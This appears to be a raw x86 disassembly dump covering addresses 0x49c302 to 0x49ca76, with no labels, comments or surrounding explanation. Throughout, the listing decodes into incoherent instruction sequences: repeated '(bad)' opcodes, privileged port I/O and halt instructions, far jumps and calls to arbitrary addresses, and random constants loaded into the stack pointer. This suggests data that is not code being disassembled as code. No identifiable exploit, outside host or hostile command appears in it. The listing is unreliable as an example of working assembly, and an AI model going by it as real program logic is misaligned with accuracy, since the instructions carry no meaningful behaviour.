  49c302:	xor    BYTE PTR [edi+0x687e1d8b],bh
  49c308:	add    al,0x2e
  49c30a:	sub    bh,dh
  49c30c:	sbb    dl,bh
  49c30e:	shl    DWORD PTR [ecx+0x1932a20d],cl
  49c314:	add    dl,BYTE PTR [esi+0x4]
  49c317:	retf   0x699e
  49c31a:	cmp    eax,0x3bed37d3
  49c31f:	stos   DWORD PTR es:[edi],eax
  49c320:	dec    ebp
  49c321:	in     al,dx
  49c322:	rcl    BYTE PTR [ebx+ebx*2],cl
  49c325:	popa   
  49c326:	dec    edi
  49c327:	stos   DWORD PTR es:[edi],eax
  49c328:	cmp    ch,ch
  49c32a:	gs sbb al,0x14
  49c32d:	or     al,0x82
  49c32f:	or     BYTE PTR [edx],cl
  49c331:	rol    BYTE PTR [edi-0x70954bf3],cl
  49c337:	sbb    esi,eax
  49c339:	and    al,0xb0
  49c33b:	inc    ebx
  49c33c:	jb     0x49c2cb
  49c33e:	mov    eax,0xbd0551a6
  49c343:	adc    ch,al
  49c345:	or     eax,0x8799ec5
  49c34a:	inc    esi
  49c34b:	add    eax,0xf400cc1e
  49c350:	mov    esp,0x82b8cd8c
  49c355:	pushf  
  49c356:	sub    esi,esi
  49c358:	inc    ecx
  49c359:	add    al,0x91
  49c35b:	js     0x49c2de
  49c35d:	scas   eax,DWORD PTR es:[edi]
  49c35e:	cmp    ecx,DWORD PTR [ebx+0x721131d8]
  49c364:	jae    0x49c3b0
  49c366:	and    eax,DWORD PTR [eax+edi*1]
  49c369:	sub    edi,eax
  49c36b:	add    bl,BYTE PTR [edx+0x3cc2384f]
  49c371:	inc    ebx
  49c372:	call   0x961c2303
  49c377:	mov    cl,0x7e
  49c379:	stos   BYTE PTR es:[edi],al
  49c37a:	push   ecx
  49c37b:	ret    
  49c37c:	mov    esp,0xb4768369
  49c381:	sub    dl,BYTE PTR ds:0xe2e2ec04
  49c387:	add    al,0x81
  49c389:	ret    0xfb81
  49c38c:	and    esp,DWORD PTR [edx+eax*4+0x5ff2eee]
  49c393:	das    
  49c394:	mov    DWORD PTR [edx+0x66587029],ecx
  49c39a:	cdq    
  49c39b:	mov    esp,0x430b42cb
  49c3a0:	loopne 0x49c34e
  49c3a2:	imul   esp,DWORD PTR [ecx-0x3cd2813e],0xffffffcb
  49c3a9:	mov    ds:0xc6cdeb2a,eax
  49c3ae:	xchg   BYTE PTR [ebp-0x2ee076da],dh
  49c3b4:	mov    edi,0x189c7788
  49c3b9:	sbb    eax,DWORD PTR [esi-0x446d6891]
  49c3bf:	adc    eax,0x3c161849
  49c3c4:	sar    BYTE PTR [eax-0x53d5bba],1
  49c3ca:	mov    esp,0x8bff4864
  49c3cf:	inc    ebp
  49c3d0:	in     al,0xc
  49c3d2:	add    eax,edi
  49c3d4:	pop    edx
  49c3d5:	rcl    BYTE PTR [esi+0x627ef466],1
  49c3db:	jg     0x49c3e4
  49c3dd:	test   bh,bl
  49c3df:	xchg   DWORD PTR [ebx+0x4302ebfb],ecx
  49c3e5:	inc    edi
  49c3e6:	and    al,0x3b
  49c3e8:	pop    ecx
  49c3e9:	or     BYTE PTR [ebx+0x4f],dh
  49c3ec:	mov    esi,DWORD PTR [esi-0x2]
  49c3ef:	ins    DWORD PTR es:[edi],dx
  49c3f0:	add    ebx,DWORD PTR [edi-0x74]
  49c3f3:	mov    esi,0x38831517
  49c3f8:	fld    QWORD PTR [eax-0x746fdb58]
  49c3fe:	cmp    DWORD PTR [esi-0x1fa0b8fc],0x7e
  49c405:	pusha  
  49c406:	jns    0x49c3f3
  49c408:	mov    edx,DWORD PTR [esi+edx*1+0x1c]
  49c40c:	inc    ecx
  49c40d:	jne    0x49c412
  49c40f:	adc    edi,DWORD PTR [esi+0x41d25863]
  49c415:	pusha  
  49c416:	cwde   
  49c417:	push   eax
  49c418:	and    DWORD PTR [eax-0x1f],esi
  49c41b:	add    al,0xe8
  49c41d:	stos   BYTE PTR es:[edi],al
  49c41e:	fcomp  QWORD PTR [edx+0xef04423]
  49c424:	sub    eax,DWORD PTR [ebp-0x10]
  49c427:	jl     0x49c3d0
  49c429:	icebp  
  49c42a:	or     al,0x16
  49c42c:	shl    DWORD PTR [ebx],0x37
  49c42f:	cmp    eax,0x50ba44fb
  49c434:	(bad)  
  49c435:	daa    
  49c436:	sub    bh,ch
  49c438:	add    edx,DWORD PTR [edx]
  49c43a:	jl     0xdf006dda
  49c440:	xchg   edx,eax
  49c441:	xchg   DWORD PTR [eax-0x65f4a073],esi
  49c447:	sbb    ah,al
  49c449:	jmp    0x44044691
  49c44e:	cs jbe 0x49c4ce
  49c451:	scas   al,BYTE PTR es:[edi]
  49c452:	aam    0x93
  49c454:	xor    ebp,ebx
  49c456:	or     eax,esi
  49c458:	inc    eax
  49c459:	add    dh,al
  49c45b:	sub    DWORD PTR [esp+ecx*4+0x18],0x1c
  49c460:	pop    ds
  49c461:	jge    0x49c484
  49c463:	mov    ecx,es
  49c465:	outs   dx,DWORD PTR ds:[esi]
  49c466:	lods   eax,DWORD PTR ds:[esi]
  49c467:	add    esp,0x4e84583
  49c46d:	cmp    bl,BYTE PTR [eax+ebp*1+0x61]
  49c471:	and    eax,0xd98e4084
  49c476:	stos   DWORD PTR es:[edi],eax
  49c477:	jbe    0x49c41b
  49c479:	loopne 0x49c424
  49c47b:	sbb    BYTE PTR [esi],al
  49c47d:	fidivr DWORD PTR [edx+0x45ca91b3]
  49c483:	dec    esp
  49c484:	pushf  
  49c485:	test   BYTE PTR [edx-0x60],bl
  49c488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49c489:	or     eax,0x458c15a8
  49c48e:	cmp    cl,BYTE PTR [ebx+eax*1+0x4]
  49c492:	push   eax
  49c493:	inc    edx
  49c494:	jecxz  0x49c50c
  49c496:	add    edx,edi
  49c498:	inc    ecx
  49c499:	pop    esp
  49c49a:	push   ebp
  49c49b:	fdiv   DWORD PTR [ebp-0x66]
  49c49e:	push   ss
  49c49f:	push   esi
  49c4a0:	cmp    BYTE PTR [ecx-0x7bd21efd],cl
  49c4a6:	dec    edi
  49c4a7:	mov    ds:0x117549e9,al
  49c4ac:	pop    eax
  49c4ad:	pushf  
  49c4ae:	leave  
  49c4af:	inc    esi
  49c4b0:	sub    ch,ah
  49c4b2:	imul   esi,DWORD PTR [eax-0x1a],0x10
  49c4b6:	and    DWORD PTR [ebx+0x1b],ebp
  49c4b9:	fisttp DWORD PTR [esi+0x62]
  49c4bc:	shr    BYTE PTR [ebp+0x385e242d],1
  49c4c2:	loop   0x49c4de
  49c4c4:	mov    esp,0x853faaa
  49c4c9:	push   ss
  49c4ca:	in     al,0x9b
  49c4cc:	cmp    bl,ch
  49c4ce:	push   ss
  49c4cf:	jg     0x49c4fc
  49c4d1:	mov    edi,0x4769b680
  49c4d6:	dec    esi
  49c4d7:	hlt    
  49c4d8:	call   0xb3ebd811
  49c4dd:	imul   esp,eax,0xffffff8b
  49c4e0:	ss mov eax,0x94f6c1b
  49c4e6:	sbb    cl,dh
  49c4e8:	dec    eax
  49c4e9:	adc    eax,0xe6c1d066
  49c4ee:	rol    BYTE PTR [edi],cl
  49c4f0:	call   0xee350235
  49c4f5:	xor    al,0xb
  49c4f7:	pop    esp
  49c4f8:	js     0x49c55d
  49c4fa:	pop    ss
  49c4fb:	pop    eax
  49c4fc:	adc    bl,BYTE PTR [ebp+0x57]
  49c4ff:	cli    
  49c500:	add    BYTE PTR [ebx],0x3
  49c503:	xchg   edi,eax
  49c504:	adc    BYTE PTR [edi+0x620e1c99],bl
  49c50a:	xchg   DWORD PTR [edx],edi
  49c50c:	push   esp
  49c50d:	add    ebp,DWORD PTR [ecx]
  49c50f:	je     0x49c51e
  49c511:	shr    DWORD PTR [ecx],0xe3
  49c514:	inc    ecx
  49c515:	and    BYTE PTR [esi],ah
  49c517:	shr    eax,cl
  49c519:	outs   dx,BYTE PTR ds:[esi]
  49c51a:	ins    BYTE PTR es:[edi],dx
  49c51b:	pop    es
  49c51c:	or     al,0xb8
  49c51e:	adc    al,0xd
  49c520:	add    eax,0xd05c34d1
  49c525:	fwait
  49c526:	add    DWORD PTR [eax+0x70d80347],esp
  49c52c:	lock mov ah,0x13
  49c52f:	adc    BYTE PTR [edx+0x66e49fb7],ah
  49c535:	push   ss
  49c536:	loopne 0x49c4fe
  49c538:	rcr    BYTE PTR [edx+0x3ac30727],0x1
  49c53f:	xor    DWORD PTR [eax-0x5245d578],edx
  49c545:	sub    eax,0x30924e95
  49c54a:	mov    edx,0x27b95208
  49c54f:	mov    edx,DWORD PTR [edi+0x5f]
  49c552:	mov    al,0xb0
  49c554:	out    dx,eax
  49c555:	and    al,0x3f
  49c557:	fcom   QWORD PTR [edi-0x5a628590]
  49c55d:	pop    ds
  49c55e:	test   DWORD PTR [esi],ebp
  49c560:	and    BYTE PTR [edi+0x68],cl
  49c563:	test   al,0x1
  49c565:	(bad)  
  49c566:	and    DWORD PTR ds:0xe1003835,eax
  49c56c:	mov    eax,0x15804d72
  49c571:	sub    BYTE PTR [eax],bh
  49c573:	sub    al,0xf5
  49c575:	or     DWORD PTR [esi+edi*1],edx
  49c578:	lds    esp,FWORD PTR [esi-0x49]
  49c57b:	mov    eax,ds:0xcf2f2249
  49c580:	mov    esi,0xa2e90783
  49c585:	pop    ds
  49c586:	push   ebp
  49c587:	adc    BYTE PTR [edx-0x18],dl
  49c58a:	pop    edx
  49c58b:	je     0x49c5d3
  49c58d:	or     DWORD PTR [edi],ecx
  49c58f:	jmp    0x8d8a:0x1b583078
  49c596:	adc    esp,DWORD PTR [bp+di]
  49c599:	or     BYTE PTR [edi+eax*2],dh
  49c59c:	sub    DWORD PTR [esi+0x56de0a27],edx
  49c5a2:	and    eax,0x3b4e8508
  49c5a7:	add    dl,0x6e
  49c5aa:	adc    bl,BYTE PTR [esp+ebp*2]
  49c5ad:	pop    esp
  49c5ae:	pop    es
  49c5af:	or     al,0xc0
  49c5b1:	sbb    DWORD PTR ss:[eax+0x1050849e],esp
  49c5b8:	cmp    al,0xeb
  49c5ba:	add    eax,0xa2c28176
  49c5bf:	jne    0x49c5d6
  49c5c1:	pop    ds
  49c5c2:	mov    eax,ds:0xc56f6591
  49c5c7:	call   0xae43:0x7a14118c
  49c5ce:	adc    ecx,DWORD PTR [eax+0x25]
  49c5d1:	or     DWORD PTR [edi],ebx
  49c5d3:	nop
  49c5d4:	into   
  49c5d5:	add    al,ch
  49c5d7:	add    eax,0xb776d9e8
  49c5dc:	push   cs
  49c5dd:	jge    0x49c5a9
  49c5df:	sbb    al,0x17
  49c5e1:	inc    edx
  49c5e2:	add    ebx,DWORD PTR [esi-0x3d]
  49c5e5:	inc    esp
  49c5e6:	xchg   DWORD PTR [esi],edi
  49c5e8:	lods   al,BYTE PTR ds:[esi]
  49c5e9:	push   edi
  49c5ea:	aad    0xe6
  49c5ec:	(bad)  
  49c5ed:	fdiv   st(5),st
  49c5ef:	mov    ebp,0x26c34041
  49c5f4:	push   ss
  49c5f5:	add    al,0xa7
  49c5f7:	push   ebx
  49c5f8:	sahf   
  49c5f9:	and    cl,BYTE PTR [edi+0x1e877610]
  49c5ff:	pop    ss
  49c600:	and    DWORD PTR [eax],ecx
  49c602:	xor    dh,BYTE PTR [edi]
  49c604:	xchg   ebx,eax
  49c605:	or     BYTE PTR [edx],ch
  49c607:	dec    ebx
  49c608:	sbb    eax,0x48af682c
  49c60d:	inc    edi
  49c60e:	inc    ebx
  49c60f:	add    DWORD PTR [ebx+0x3],ebx
  49c612:	add    eax,0xba356a8d
  49c617:	cmp    al,0xd4
  49c619:	cmp    eax,DWORD PTR [esi]
  49c61b:	inc    ebx
  49c61c:	cmp    al,BYTE PTR [ebx+eax*8-0x29031950]
  49c623:	xchg   ebx,eax
  49c624:	outs   dx,BYTE PTR ds:[esi]
  49c625:	add    eax,0x24ea4581
  49c62a:	out    0xdb,al
  49c62c:	sub    bl,dh
  49c62e:	in     eax,dx
  49c62f:	das    
  49c630:	sub    ecx,DWORD PTR [ebp-0x4d70bb13]
  49c636:	jno    0x49c623
  49c638:	push   ebp
  49c639:	aam    0x33
  49c63b:	jle    0x49c61e
  49c63d:	jg     0x49c5fa
  49c63f:	jne    0x49c6ab
  49c641:	test   ecx,esp
  49c643:	in     eax,0x37
  49c645:	sub    ecx,DWORD PTR [ecx-0x23]
  49c648:	fadd   st,st(2)
  49c64a:	std    
  49c64b:	adc    al,0x65
  49c64d:	add    bl,BYTE PTR [edx+0x32b60887]
  49c653:	cwde   
  49c654:	mov    ah,0xc9
  49c656:	ss loop 0x49c62d
  49c659:	fdiv   QWORD PTR [ebp+0xd724ac]
  49c65f:	ss push esi
  49c661:	inc    ebx
  49c662:	pop    ds
  49c663:	dec    esi
  49c664:	idiv   DWORD PTR [edx-0x1e]
  49c667:	jl     0x49c691
  49c669:	call   0x75dc:0x28255150
  49c670:	mov    ebp,0x58e77a7d
  49c675:	ins    BYTE PTR es:[edi],dx
  49c676:	cmp    BYTE PTR [eax],cl
  49c678:	(bad)  
  49c679:	pop    ebp
  49c67a:	xchg   edx,eax
  49c67b:	aam    0x1d
  49c67d:	inc    esi
  49c67e:	dec    ecx
  49c67f:	cmp    DWORD PTR [ebp+eax*8+0x33],0x2a
  49c684:	jmp    0x1de18c31
  49c689:	lds    ecx,FWORD PTR [ecx-0x6f3b0dae]
  49c68f:	lock das 
  49c691:	and    eax,0x54a87cf2
  49c696:	popf   
  49c697:	lock fdiv st,st(6)
  49c69a:	mov    edx,0x9d722639
  49c69f:	dec    edi
  49c6a0:	mov    ds:0x658422a8,eax
  49c6a5:	dec    ebx
  49c6a6:	and    eax,0x837282eb
  49c6ab:	(bad)  
  49c6ac:	xor    al,0xee
  49c6ae:	mov    ah,0x33
  49c6b0:	scas   al,BYTE PTR es:[edi]
  49c6b1:	and    eax,0x5705d506
  49c6b6:	or     eax,0x6126609
  49c6bb:	aaa    
  49c6bc:	xor    al,0x27
  49c6be:	xor    al,0x84
  49c6c0:	fsubr  DWORD PTR [eax+0x74e0d81e]
  49c6c6:	mov    WORD PTR [ecx],cs
  49c6c8:	loopne 0x49c722
  49c6ca:	xor    ch,ch
  49c6cc:	fwait
  49c6cd:	dec    eax
  49c6ce:	dec    esp
  49c6cf:	jmp    0xe4a1d797
  49c6d4:	cwde   
  49c6d5:	shr    BYTE PTR [ecx+0x2a],0x1a
  49c6d9:	clc    
  49c6da:	in     al,0x0
  49c6dc:	aas    
  49c6dd:	xchg   edx,eax
  49c6de:	mov    eax,0x32bdd9e4
  49c6e3:	xchg   DWORD PTR [esi],edi
  49c6e5:	mov    al,0x2f
  49c6e7:	fstp   DWORD PTR [edx]
  49c6e9:	pushf  
  49c6ea:	(bad)  
  49c6ec:	push   ebp
  49c6ed:	cld    
  49c6ee:	rcr    DWORD PTR [esi],cl
  49c6f0:	mov    al,BYTE PTR [edx+0x3]
  49c6f3:	fisttp WORD PTR [eax-0x18]
  49c6f6:	or     DWORD PTR [ebp-0x13b730f3],edi
  49c6fc:	sub    bl,bl
  49c6fe:	dec    esi
  49c6ff:	fxch   st(1)
  49c701:	jmp    0x49c705
  49c703:	outs   dx,BYTE PTR ds:[esi]
  49c704:	sub    BYTE PTR [edx+0x262edffc],dh
  49c70a:	xor    dl,BYTE PTR [eax+edi*2]
  49c70d:	push   si
  49c70f:	pop    ss
  49c710:	inc    esi
  49c711:	fsubr  DWORD PTR [ecx+edi*2-0x10]
  49c715:	xor    BYTE PTR [esi],0xd9
  49c718:	call   0xb3382429
  49c71d:	imul   ebp,DWORD PTR [eax],0x7e8028c
  49c723:	aad    0xe4
  49c725:	push   edx
  49c726:	xchg   esi,eax
  49c727:	add    cl,0x0
  49c72a:	adc    BYTE PTR [ecx-0x7c86bf17],dl
  49c730:	xrelease mov BYTE PTR [eax],ah
  49c733:	mov    bh,0x6c
  49c735:	mov    eax,DWORD PTR [ebp-0x20]
  49c738:	in     al,0xe4
  49c73a:	add    BYTE PTR [ecx-0x13e2cc4d],bl
  49c740:	adc    ch,BYTE PTR [eax-0x4661fadc]
  49c746:	pusha  
  49c747:	retf   
  49c748:	xchg   edi,eax
  49c749:	loopne 0x49c73f
  49c74b:	mov    ecx,0xe83c0421
  49c750:	ds inc dx
  49c753:	mov    DWORD PTR [ebx+ebx*8+0x37813819],eax
  49c75a:	je     0x49c7a4
  49c75c:	inc    esi
  49c75d:	dec    ebx
  49c75e:	lods   eax,DWORD PTR ds:[esi]
  49c75f:	(bad)  
  49c760:	mov    edx,DWORD PTR [ebx+eiz*1]
  49c763:	or     bl,bl
  49c765:	cmp    DWORD PTR [ebx+0x18],0x7c
  49c769:	adc    al,0x2f
  49c76b:	or     DWORD PTR ss:[edi],0xffffff8c
  49c76f:	ja     0x49c70d
  49c771:	sub    DWORD PTR [edi+edi*4],eax
  49c774:	lods   al,BYTE PTR ds:[esi]
  49c775:	mov    al,BYTE PTR [eax]
  49c777:	in     al,0xf
  49c779:	sub    BYTE PTR [eax-0x1c],0x6f
  49c77d:	adc    al,dh
  49c77f:	ror    BYTE PTR [edx-0x43],cl
  49c782:	push   esi
  49c783:	or     BYTE PTR [ebx],bl
  49c785:	cdq    
  49c786:	mov    ch,ch
  49c788:	in     al,0x43
  49c78a:	dec    ecx
  49c78b:	ins    DWORD PTR es:[edi],dx
  49c78c:	adc    al,0x7
  49c78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c78f:	fnstsw WORD PTR [eax-0x23]
  49c792:	test   BYTE PTR ds:0x20818572,ah
  49c798:	pop    es
  49c799:	mov    ds:0xe1de288b,al
  49c79e:	jb     0x49c803
  49c7a0:	push   esi
  49c7a1:	or     al,0x8b
  49c7a3:	add    cl,bl
  49c7a5:	and    al,0xde
  49c7a7:	or     al,bl
  49c7a9:	mov    esi,DWORD PTR [ebp+0x11]
  49c7ac:	xor    al,al
  49c7ae:	icebp  
  49c7af:	in     al,dx
  49c7b0:	sbb    ecx,ebp
  49c7b2:	fcomp  QWORD PTR [edi]
  49c7b4:	jle    0x49c79b
  49c7b6:	jg     0x49c82e
  49c7b8:	popa   
  49c7b9:	sub    eax,0x38d2331b
  49c7be:	push   ss
  49c7bf:	setne  dl
  49c7c2:	mov    esi,edx
  49c7c4:	mov    al,0x3e
  49c7c6:	pop    ebx
  49c7c7:	lods   eax,DWORD PTR ds:[esi]
  49c7c8:	fidiv  DWORD PTR [eax+0x4]
  49c7cb:	adc    esi,DWORD PTR [esi]
  49c7cd:	cmp    DWORD PTR [esi],0x4
  49c7d0:	daa    
  49c7d1:	and    dl,0x9c
  49c7d4:	cwde   
  49c7d5:	mov    ah,0xd4
  49c7d7:	xor    bh,BYTE PTR [ebx+0x1856d3b]
  49c7dd:	inc    ebx
  49c7de:	mov    bh,0x33
  49c7e0:	test   BYTE PTR ds:0xc10c8ca9,0x69
  49c7e7:	pushf  
  49c7e8:	call   0x1a4:0xabe49949
  49c7ef:	push   ebp
  49c7f0:	in     al,0x52
  49c7f2:	inc    ebp
  49c7f3:	sbb    BYTE PTR [eax+0x43],bh
  49c7f6:	push   es
  49c7f7:	push   0xf030e51b
  49c7fc:	jb     0x49c791
  49c7fe:	pop    ss
  49c7ff:	xchg   ebp,eax
  49c800:	push   es
  49c801:	xor    al,BYTE PTR [ebx]
  49c803:	in     al,dx
  49c804:	pop    ss
  49c805:	ret    0x13a2
  49c808:	into   
  49c809:	mov    al,ds:0x5d981e0b
  49c80e:	add    DWORD PTR [esi-0x51],eax
  49c811:	data16 xlat BYTE PTR ds:[ebx]
  49c813:	push   es
  49c814:	push   esi
  49c815:	jae    0x49c873
  49c817:	stos   DWORD PTR es:[edi],eax
  49c818:	xor    ebp,DWORD PTR [ebp+0x51]
  49c81b:	dec    esi
  49c81c:	adc    cl,0x1
  49c81f:	sub    eax,0x83a233e8
  49c824:	sahf   
  49c825:	sbb    al,0x21
  49c827:	dec    edi
  49c828:	or     al,0xe1
  49c82a:	dec    ecx
  49c82b:	jmp    0x64501110
  49c830:	inc    eax
  49c831:	dec    ecx
  49c832:	dec    ecx
  49c833:	pop    es
  49c834:	xchg   esi,eax
  49c835:	cmp    al,0xb9
  49c837:	dec    ecx
  49c838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49c839:	loopne 0x49c882
  49c83b:	inc    edx
  49c83c:	cwde   
  49c83d:	std    
  49c83e:	rol    BYTE PTR [esi+eiz*8-0x7a],0xa3
  49c843:	xchg   BYTE PTR [ecx+0x1d223c2c],dh
  49c849:	inc    eax
  49c84a:	or     ch,dh
  49c84c:	mov    edx,0x9580e0ec
  49c851:	jecxz  0x49c846
  49c853:	xor    ch,BYTE PTR [eax-0x766c4935]
  49c859:	and    cl,BYTE PTR es:[edi+0x53]
  49c85d:	in     al,0xb0
  49c85f:	leave  
  49c860:	out    dx,eax
  49c861:	inc    eax
  49c862:	and    ecx,esp
  49c864:	xor    DWORD PTR [ebx-0xb],eax
  49c867:	mov    ebx,0x2f2f6da6
  49c86c:	cli    
  49c86d:	mov    DWORD PTR [edx+0x4],ebp
  49c870:	inc    ebp
  49c871:	and    eax,DWORD PTR [ecx]
  49c873:	dec    esi
  49c874:	or     ecx,ecx
  49c876:	rol    DWORD PTR [edi+0x2],1
  49c879:	(bad)  
  49c87a:	out    dx,al
  49c87b:	sahf   
  49c87c:	pusha  
  49c87d:	or     esi,ecx
  49c87f:	packssdw mm0,mm6
  49c882:	xchg   BYTE PTR [ebx+edx*2+0x58],al
  49c886:	shl    BYTE PTR [edx],cl
  49c888:	add    al,0x94
  49c88a:	stc    
  49c88b:	adc    al,al
  49c88d:	inc    eax
  49c88e:	adc    bl,BYTE PTR [esi]
  49c890:	scas   al,BYTE PTR es:[edi]
  49c891:	push   edx
  49c892:	push   ebx
  49c893:	inc    edx
  49c894:	jmp    0x49c860
  49c896:	int3   
  49c897:	lock xor bl,ch
  49c89a:	push   cs
  49c89b:	mov    WORD PTR [edx],ss
  49c89d:	jmp    0x58ae189e
  49c8a2:	sahf   
  49c8a3:	ins    DWORD PTR es:[edi],dx
  49c8a4:	(bad)  
  49c8a5:	popf   
  49c8a6:	aam    0xdf
  49c8a8:	test   edi,ebx
  49c8aa:	push   es
  49c8ab:	inc    eax
  49c8ac:	(bad)  
  49c8ae:	add    BYTE PTR [edx+0x1],dl
  49c8b1:	imul   ebx,DWORD PTR [ecx],0xcb906623
  49c8b7:	ror    al,cl
  49c8b9:	add    BYTE PTR [ecx],ch
  49c8bb:	inc    esp
  49c8bc:	pop    esp
  49c8bd:	adc    esp,DWORD PTR [esi]
  49c8bf:	aas    
  49c8c0:	adc    DWORD PTR [edi],edi
  49c8c2:	das    
  49c8c3:	in     al,0x25
  49c8c5:	icebp  
  49c8c6:	push   0x59
  49c8c8:	push   esp
  49c8c9:	mov    al,ds:0x5e3aa024
  49c8ce:	dec    esi
  49c8cf:	and    BYTE PTR [edi],ch
  49c8d1:	sbb    esi,ebx
  49c8d3:	mov    al,ds:0xade1c6a
  49c8d8:	jns    0x49c8a2
  49c8da:	dec    ecx
  49c8db:	mov    al,ds:0x4e6aa06a
  49c8e0:	xor    DWORD PTR [eax-0x28],esi
  49c8e3:	jge    0x49c8c2
  49c8e5:	fnstsw WORD PTR [edi]
  49c8e7:	mov    al,ds:0xd3ce3c6a
  49c8ec:	pop    ebp
  49c8ed:	pop    ss
  49c8ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49c8ef:	inc    esi
  49c8f0:	ret    0xd848
  49c8f3:	jp     0x49c8ce
  49c8f5:	pusha  
  49c8f6:	cli    
  49c8f7:	push   ebp
  49c8f8:	fsub   DWORD PTR [eax-0xc9a4247]
  49c8fe:	pop    ebp
  49c8ff:	adc    BYTE PTR [ebx],al
  49c901:	adc    ebx,ebp
  49c903:	fstp   QWORD PTR [ebx]
  49c905:	inc    edi
  49c906:	jo     0x49c88e
  49c908:	dec    esi
  49c909:	loopne 0x49c91e
  49c90b:	mov    eax,ds:0x46b8ca11
  49c910:	inc    edx
  49c911:	in     al,0xbb
  49c913:	ret    0xe4dc
  49c916:	lea    eax,[esp+esi*1+0x7bddaeb3]
  49c91d:	xchg   ecx,eax
  49c91e:	clc    
  49c91f:	or     al,0x30
  49c921:	hlt    
  49c922:	es call 0xa980:0xd18c28dd
  49c92a:	jb     0x49c935
  49c92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49c92d:	and    BYTE PTR [ecx+0x58dd721c],dl
  49c933:	mov    bl,BYTE PTR [esi+eax*2+0x6a8891c1]
  49c93a:	sbb    BYTE PTR [ebx],ch
  49c93c:	jp     0x49c906
  49c93e:	xchg   ecx,eax
  49c93f:	push   ebx
  49c940:	popa   
  49c941:	or     eax,0xb9a0b9a0
  49c946:	in     al,0xa0
  49c948:	xor    BYTE PTR [esi-0x1c],ch
  49c94b:	movntps XMMWORD PTR [ebx],xmm2
  49c94e:	adc    al,0x86
  49c950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c951:	(bad)  
  49c952:	adc    DWORD PTR [eax-0x6f70dfd0],esp
  49c958:	mov    ecx,0x2683b9a0
  49c95d:	mov    edx,0x61b5f21
  49c962:	clc    
  49c963:	ins    BYTE PTR es:[edi],dx
  49c964:	or     eax,0x20e18bb6
  49c969:	mov    esi,0x97c9a0a9
  49c96e:	push   es
  49c96f:	mov    ds,ecx
  49c971:	cld    
  49c972:	sbb    dl,BYTE PTR [eax-0x7acf17b0]
  49c978:	rcl    dl,0xdc
  49c97b:	sub    ebx,0x452808ed
  49c981:	scas   eax,DWORD PTR es:[edi]
  49c982:	fdiv   QWORD PTR [ecx]
  49c984:	fsub   DWORD PTR [edx]
  49c986:	sbb    DWORD PTR [eax+0x71852828],edx
  49c98c:	aam    0xf2
  49c98e:	fs ins BYTE PTR es:[edi],dx
  49c990:	mov    ds:0xa27890d5,eax
  49c995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c996:	mov    eax,ds:0xffab7211
  49c99b:	jb     0x49c969
  49c99d:	xor    eax,0x70ebc28a
  49c9a2:	mov    WORD PTR [esi],es
  49c9a4:	adc    ch,BYTE PTR cs:0xb749bb6c
  49c9ab:	movhps QWORD PTR [edi+edi*1-0x1ef932a0],xmm6
  49c9b3:	int3   
  49c9b4:	jns    0x49c9dc
  49c9b6:	in     al,0xd3
  49c9b8:	jmp    0x3ef6:0x6975cd88
  49c9bf:	int    0xe7
  49c9c1:	push   esi
  49c9c2:	sbb    ecx,esi
  49c9c4:	cmp    eax,esi
  49c9c6:	int    0xf
  49c9c8:	pop    es
  49c9c9:	cmp    al,0xef
  49c9cb:	jns    0x49c9db
  49c9cd:	xor    ah,BYTE PTR ds:0xa27e464e
  49c9d3:	test   esp,0xbe70f776
  49c9d9:	pop    es
  49c9da:	mov    ds:0x595017ce,eax
  49c9df:	es jl  0x49c9a0
  49c9e2:	idiv   ecx
  49c9e4:	and    ecx,edi
  49c9e6:	inc    edx
  49c9e7:	add    ah,dl
  49c9e9:	outs   dx,DWORD PTR ds:[esi]
  49c9ea:	iret   
  49c9eb:	pop    es
  49c9ec:	daa    
  49c9ed:	outs   dx,DWORD PTR ds:[esi]
  49c9ee:	xor    edi,ecx
  49c9f0:	idiv   DWORD PTR [edi+ecx*8]
  49c9f3:	sar    DWORD PTR [edi],cl
  49c9f5:	dec    ecx
  49c9f6:	push   0xffffffd6
  49c9f8:	mov    DWORD PTR [esi],eax
  49c9fa:	jns    0x49c9eb
  49c9fc:	mov    ebx,0x26d01ec8
  49ca01:	psrad  mm4,QWORD PTR [esi]
  49ca04:	out    dx,al
  49ca05:	push   es
  49ca06:	clc    
  49ca07:	fstp   TBYTE PTR [esi]
  49ca09:	dec    edi
  49ca0a:	repz mov ebp,0x8dc7add2
  49ca10:	mov    al,0x3e
  49ca12:	fcmovnbe st,st(2)
  49ca14:	daa    
  49ca15:	iret   
  49ca16:	repz out dx,al
  49ca18:	xor    edx,ecx
  49ca1a:	sbb    ebx,edx
  49ca1c:	pushw  es
  49ca1e:	je     0x49c9c0
  49ca20:	push   es
  49ca21:	stc    
  49ca22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ca23:	sub    al,0x98
  49ca25:	aam    0x43
  49ca27:	add    al,0x1
  49ca29:	add    bh,ch
  49ca2b:	leave  
  49ca2c:	inc    edx
  49ca2d:	imul   BYTE PTR [esi]
  49ca2f:	xlat   BYTE PTR ds:[ebx]
  49ca30:	and    BYTE PTR [ecx+0x531616c2],dh
  49ca36:	or     al,BYTE PTR [edi+0x29]
  49ca39:	or     ecx,DWORD PTR [ebp-0x29]
  49ca3c:	push   cs
  49ca3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ca3e:	ja     0x49caa4
  49ca40:	or     bl,BYTE PTR [eax]
  49ca42:	push   es
  49ca43:	and    al,0xd9
  49ca45:	rcl    DWORD PTR gs:[edx+0x16],0x37
  49ca4a:	jb     0x49c9f1
  49ca4c:	sub    al,0xbc
  49ca4e:	push   esi
  49ca4f:	and    eax,0x10e56025
  49ca54:	pop    eax
  49ca55:	rcl    BYTE PTR [ebx+ebp*8],1
  49ca58:	add    eax,0x3800b09
  49ca5d:	jno    0x49ca90
  49ca5f:	pushf  
  49ca60:	rcr    BYTE PTR [ebx+0x24],0x87
  49ca64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ca65:	cmp    cl,ah
  49ca67:	or     ebx,esp
  49ca69:	cdq    
  49ca6a:	cmp    BYTE PTR [esp+ebx*1-0x5a43f366],dl
  49ca71:	dec    edx
  49ca72:	adc    dl,BYTE PTR [eax]
  49ca74:	dec    esp
  49ca75:	push   cs
  49ca76:	xor    al,0x6
